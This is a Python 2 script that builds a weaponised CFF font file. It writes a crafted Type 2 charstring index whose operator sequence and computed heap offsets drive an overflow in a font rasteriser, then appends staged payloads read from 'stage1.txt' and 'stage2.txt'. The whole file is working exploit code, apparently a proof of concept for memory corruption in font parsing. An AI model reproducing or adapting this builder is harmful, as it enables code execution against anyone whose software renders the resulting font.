import struct, shutil
from cStringIO import StringIO

def wb(f, n):
    f.write(chr(n))
def wh(f, n):
    f.write(struct.pack('>H', n))
def ww(f, n):
    f.write(struct.pack('>I', n))

def write_index(f, idx):
    count = len(idx)
    wh(f, count)
    if count == 0: return
    wb(f, 4) # offsize
    q = 1
    for i in xrange(count+1):
        ww(f, q)
        if i != count:
            q += len(idx[i])
    for thing in idx:
        f.write(thing)


def writeN(f, n):
    f.write(struct.pack('>BI', 255, n))

#shutil.copy('z.cff', 'out.cff')
f = open('out.cff', 'wb')
f.write(open('z.cff', 'rb').read())

magic_number = (0xd28 - 0xa24)/4
# [start-of-overwrite-area - start-of-heap]/4

dontcare = 0
stage1 = open('stage1.txt', 'rb').read()
stage2 = open('stage2.txt', 'rb').read()
info = struct.unpack('I'*(len(stage1)/4), stage1)

assert len(info) < 48
g = StringIO()
for a in info:
    writeN(g, a)

index_number = (magic_number - 1) * 0x10000
writeN(g, index_number)
writeN(g, index_number)
writeN(g, index_number)

for i in xrange(65 - len(info) - 3):
    g.write(struct.pack('>BB', 12, 23)) # random
    g.write(struct.pack('>BB', 12, 23)) # random
    g.write(struct.pack('>BB', 12, 4)) # or /* add doesn't work. why?? */
    g.write(struct.pack('>BB', 12, 29)) # index
# the plus is to get to the END
for i in xrange(magic_number + len(info) - 65):
    g.write(struct.pack('>BB', 12, 23)) # random
    g.write(struct.pack('>BB', 12, 29)) # index
for i in xrange(len(info)):
    g.write(struct.pack('>BB', 12, 29)) # index
    g.write(struct.pack('>BB', 12, 18)) # drop

writeN(g, 0) # goto overflow so I don't have to worry about finalization
g.write('\x0e') # endchar

gvalue = g.getvalue()
gvalue2 ='\0' * (4 - (len(gvalue) % 4))
gvalue = gvalue.replace(struct.pack('>I', 0xdeadbeef), struct.pack('>I', len(gvalue) + len(gvalue2)))
gvalue2 += stage2

open('gvalue.txt', 'w').write(gvalue)
open('gvalue2.txt', 'w').write(gvalue2)

# TODO:
# value1 value2 ... valueN
# 123 (index so that it reaches back to value1)
# [random random or index]* ... until we get to the end of the zone to be overwritten
# it will now be filled with 123
# [index drop]* ... to copy
# [random random or index index] * n
write_index(f, ['\x0e\x0e\x0e\x0e', gvalue])
f.write(gvalue2)
